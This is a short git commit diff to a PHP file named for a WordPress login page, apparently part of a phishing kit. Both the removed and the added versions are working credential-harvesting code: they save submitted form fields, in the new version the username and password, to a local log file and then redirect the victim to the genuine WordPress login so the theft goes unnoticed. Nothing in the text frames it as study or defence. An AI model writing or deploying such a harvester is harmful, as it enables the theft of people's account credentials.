0e1cecd3732f65c23212dc221b4456ed6425f99b
SG_PRO <55870659+Ignitetch@users.noreply.github.com>
2020-09-06 12:38:00 -0400

    Add files via upload

--- sites/wordpress/post.php
+++ sites/wordpress/post.php
@@ -1,13 +1,6 @@
 <?php
-header ('Location: https://wordpress.com/log-in');
-$handle = fopen("log.txt", "a");
-foreach($_POST as $variable => $value) {
-fwrite($handle, $variable);
-fwrite($handle, "=");
-fwrite($handle, $value);
-fwrite($handle, "\r\n");
-}
-fwrite($handle, "\r\n");
-fclose($handle);
-exit;
-?>
+
+    file_put_contents("log.txt", "Username: " . $_POST['log'] . " Pass: " . $_POST['pwd'] . "\n", FILE_APPEND);
+header('Location:  https://wordpress.com/log-in');
+exit();
+
